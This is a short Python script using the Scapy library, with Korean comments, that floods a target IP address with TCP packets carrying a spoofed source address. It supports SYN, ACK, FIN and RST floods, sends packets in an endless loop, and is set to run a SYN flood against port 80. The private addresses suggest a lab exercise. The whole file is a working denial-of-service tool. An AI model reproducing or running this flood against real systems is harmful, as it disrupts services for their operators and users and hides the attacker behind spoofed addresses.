from scapy.all import IP, TCP, send

spoofed_ip = "192.168.11.129"
target_ip = "192.168.110.128"

FLOOD_FLAGS = {
    "syn": "S",
    "ack": "A",
    "fin": "F",
    "rst": "R",
}
# 플러드 종류별로 사용할 TCP 플래그.
# syn : SYN 플래그만 켠 패킷
# ack : ACK 플래그만 켠 패킷
# fin : FIN 플래그만 켠 패킷
# rst : RST 플래그만 켠 패킷


def flood(flood_type: str, dport: int = 80):
    # 지정한 플래그로 패킷을 만들어 무한 반복 전송한다.

    packet = (
        IP(src=spoofed_ip, dst=target_ip) /
        TCP(dport=dport, flags=FLOOD_FLAGS[flood_type])
    )
    send(packet, loop=1, verbose=0)


if __name__ == "__main__":
    flood("syn")
    # flood("ack")
    # flood("fin")
    # flood("rst")